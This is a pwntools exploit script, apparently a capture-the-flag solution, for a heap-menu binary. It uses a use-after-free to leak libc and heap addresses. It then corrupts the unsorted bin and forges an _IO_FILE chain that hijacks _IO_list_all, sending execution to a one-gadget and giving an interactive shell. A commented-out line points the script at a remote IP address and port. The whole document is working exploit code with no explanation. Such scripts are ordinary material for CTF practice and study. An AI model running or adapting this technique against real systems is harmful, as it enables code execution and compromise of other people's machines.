from pwn import *

LIBC_FILE = './libc.so.6'
libc = ELF(LIBC_FILE)
main = ELF('./300')

context.arch = 'amd64'

r = main.process(env={'LD_PRELOAD' : libc.path})
#r = remote('104.199.25.43', 1337)

def menu(sel, slot):
    r.sendlineafter('4) free', str(sel))
    r.sendlineafter('slot? (0-9)', str(slot))

def alloc(slot):
    menu(1, slot)

def printf(slot):
    menu(3, slot)
    return r.readuntil('1)')

def free(slot):
    menu(4, slot)

def write(slot, buf):
    menu(2, slot)
    r.send(buf)

def between(s, a, b):
    return s.split(a)[1].split(b)[0]

info("leaking libc")
alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
free(1)
libc_leak = printf(1)
libc_leak = libc_leak[1:].split('\n')[0]
libc_leak = libc_leak.ljust(8, '\x00')
libc_leak = u64(libc_leak)
info('libc 0x{:x}'.format(libc_leak))
libc.address = libc_leak - 0x3c1b58

info("leaking heap")
free(3)
leak_heap = printf(3)
leak_heap = leak_heap[1:].split('\n')[0]
leak_heap = leak_heap.ljust(8, '\x00')
leak_heap = u64(leak_heap)
info('heap 0x{:x}'.format(leak_heap))

info("cleaning all allocations")
free(0)
free(2)
free(4)

info("populate unsorted bin")
alloc(0)
alloc(1)
free(0)

info("hijack unsorted bin")
write(0, fit({8:leak_heap + 0x10}))
alloc(3)

info("populate bin 0x60 and hijack _IO_list_all")
ONE_GADGET = libc.address + 0xcde41
_IO_wstr_finish = libc.address + 0x3BDC90
write(1, fit({
        ## fake chunk 0x60 size
        8:0x61, # control fp->_chain
        ## fake chunk 0x60 bk
        24:leak_heap + 0x30,
        ## fake chunk 0x310 size
        40:0x311,
        ## fake chunk 0x310 bk -> hijacks _IO_list_all
        56:libc.symbols['_IO_list_all'] - 0x10,

        ## satisfy _IO_flush_all_lockp conditions on 2nd iteration
        32:0,  # fp->_chain->_mode
        192:0, # fp->_chain->_IO_write_base
        ## make it jump to _IO_wstr_finish
        216:_IO_wstr_finish - 0x18, # fp->_chain->vtable 
        ## satisfy condition of _IO_wstr_finish
        160:leak_heap + 0x50, # fp->_chain->_wide_data
        232:ONE_GADGET,
    }))
alloc(3)

info("trigger _IO_flush_all_lockp")
menu(5, 10)

r.interactive()

